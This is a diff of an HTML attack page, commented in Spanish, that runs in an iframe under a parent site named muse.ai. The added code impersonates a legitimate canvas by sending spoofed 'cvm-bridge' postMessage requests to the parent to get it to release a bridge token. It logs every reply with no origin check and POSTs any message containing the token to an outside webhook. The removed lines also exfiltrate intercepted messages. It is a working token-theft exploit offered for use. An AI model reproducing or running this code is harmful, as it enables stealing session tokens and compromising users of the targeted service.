@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bridge Token Intercept</title>
+    <title>Bridge Token Attack</title>
     <style>
         body { font-family: monospace; padding: 20px; background: #111; color: #0f0; }
         h1 { color: #fff; }
@@ -14,8 +14,8 @@
     </style>
 </head>
 <body>
-    <h1>Interceptando bridgeToken...</h1>
-    <div id="console">Esperando mensajes del padre (muse.ai)...</div>
+    <h1>Forzando el bridgeToken...</h1>
+    <div id="console">Iniciando ataque...</div>
 
     <script>
         const consola = document.getElementById('console');
@@ -29,32 +29,50 @@
             consola.scrollTop = consola.scrollHeight;
         }
 
-        // 1. Escuchar mensajes del padre
+        // 1. Escuchar la respuesta del padre
         window.addEventListener("message", (event) => {
-            // Verificamos si el mensaje viene de muse.ai (o si no tiene origen, como en el sandbox)
-            const isMuse = event.origin === "https://muse.ai" || event.origin === "null";
-            
-            if (isMuse) {
-                const dataString = JSON.stringify(event.data);
-                log("📩 Mensaje interceptado: " + dataString, "info");
+            const dataString = JSON.stringify(event.data);
+            log("📩 Mensaje recibido de " + event.origin + ": " + dataString, "info");
 
-                // 2. Exfiltrar el mensaje al webhook
-                try {
-                    fetch(`${webhookUrl}?bridge_leak=true`, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: dataString
-                    });
-                    log("✅ Mensaje enviado al webhook.", "success");
-                } catch (e) {
-                    log("❌ Error al exfiltrar: " + e.message, "error");
-                }
-            } else {
-                log("⚠️ Mensaje de origen desconocido: " + event.origin, "error");
+            // 2. Si contiene un token, exfiltrarlo
+            if (dataString.includes("bridgeToken") || dataString.includes("confirm-document")) {
+                log("🚨 ¡TOKEN ENCONTRADO! Exfiltlando...", "success");
+                fetch(`${webhookUrl}?bridge_token_stolen=true`, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: dataString
+                });
             }
         });
 
-        log("Listener de postMessage activo.", "success");
+        // 3. Forzar al padre a enviar el token (simulando ser el Canvas legítimo)
+        // Enviamos varios tipos de mensajes para ver cuál responde el padre
+        const payloads = [
+            { type: "cvm-bridge:request-document" },
+            { type: "cvm-bridge:handshake" },
+            { type: "cvm-bridge:ready" },
+            { type: "cvm-bridge:get-document" },
+            { action: "request_bridge_token" },
+            { event: "request_token" }
+        ];
+
+        log("Enviando peticiones al padre...", "info");
+        
+        payloads.forEach((p, index) => {
+            setTimeout(() => {
+                try {
+                    // Enviamos al padre (muse.ai)
+                    window.parent.postMessage(p, "*");
+                    log("➡️ Enviado al padre: " + JSON.stringify(p), "info");
+                } catch (e) {
+                    log("❌ Error al enviar: " + e.message, "error");
+                }
+            }, index * 500); // Enviamos uno cada 500ms
+        });
+
+        log("Ataque iniciado. Esperando respuestas...", "success");
     </script>
+</body>
+</html>
 </body>
 </html>
